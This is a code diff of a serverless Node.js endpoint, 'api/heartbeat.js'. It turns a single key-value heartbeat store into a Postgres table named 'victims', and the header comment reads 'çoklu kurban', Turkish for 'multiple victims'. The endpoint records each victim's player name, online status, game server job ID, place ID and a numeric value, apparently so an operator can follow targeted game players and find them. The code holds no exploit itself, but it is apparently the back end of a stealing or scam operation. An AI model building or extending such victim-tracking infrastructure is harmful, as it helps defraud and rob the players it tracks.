@@ -1,4 +1,4 @@
-// api/heartbeat.js — POST /api/heartbeat
+// api/heartbeat.js — POST /api/heartbeat — çoklu kurban
 import { neon } from "@neondatabase/serverless";
 
 const sql = neon(process.env.DATABASE_URL);
@@ -6,22 +6,14 @@ const SECRET = process.env.HEARTBEAT_SECRET || "";
 
 async function ensureTable() {
   await sql`
-    CREATE TABLE IF NOT EXISTS heartbeat (
-      key   TEXT PRIMARY KEY,
-      value TEXT NOT NULL
+    CREATE TABLE IF NOT EXISTS victims (
+      player    TEXT PRIMARY KEY,
+      status    TEXT NOT NULL DEFAULT 'offline',
+      job_id    TEXT NOT NULL DEFAULT '',
+      place_id  TEXT NOT NULL DEFAULT '',
+      value     INTEGER NOT NULL DEFAULT 0,
+      last_seen BIGINT NOT NULL DEFAULT 0
     )
-  `;
-}
-
-async function kvGet(key) {
-  const rows = await sql`SELECT value FROM heartbeat WHERE key = ${key}`;
-  return rows[0]?.value ?? null;
-}
-
-async function kvSet(key, value) {
-  await sql`
-    INSERT INTO heartbeat (key, value) VALUES (${key}, ${String(value)})
-    ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
   `;
 }
 
@@ -31,18 +23,24 @@ export default async function handler(req, res) {
   const secret = req.headers["x-secret"] || req.body?.secret || "";
   if (SECRET && secret !== SECRET) return res.status(401).json({ error: "Unauthorized" });
 
-  const playerName = req.body?.player || "Player";
-  const jobId = req.body?.jobId || "";
-  const placeId = req.body?.placeId || "";
+  const player   = req.body?.player   || "Unknown";
+  const jobId    = req.body?.jobId    || "";
+  const placeId  = req.body?.placeId  || "";
+  const value    = parseInt(req.body?.value || "0") || 0;
+  const now      = Date.now();
 
   try {
     await ensureTable();
-    const now = Date.now();
-    await kvSet("last_seen", now);
-    await kvSet("player", playerName);
-    await kvSet("status", "online");
-    if (jobId) await kvSet("job_id", jobId);
-    if (placeId) await kvSet("place_id", placeId);
+    await sql`
+      INSERT INTO victims (player, status, job_id, place_id, value, last_seen)
+      VALUES (${player}, 'online', ${jobId}, ${placeId}, ${value}, ${now})
+      ON CONFLICT (player) DO UPDATE SET
+        status    = 'online',
+        job_id    = EXCLUDED.job_id,
+        place_id  = EXCLUDED.place_id,
+        value     = EXCLUDED.value,
+        last_seen = EXCLUDED.last_seen
+    `;
     return res.status(200).json({ ok: true });
   } catch (err) {
     console.error(err);
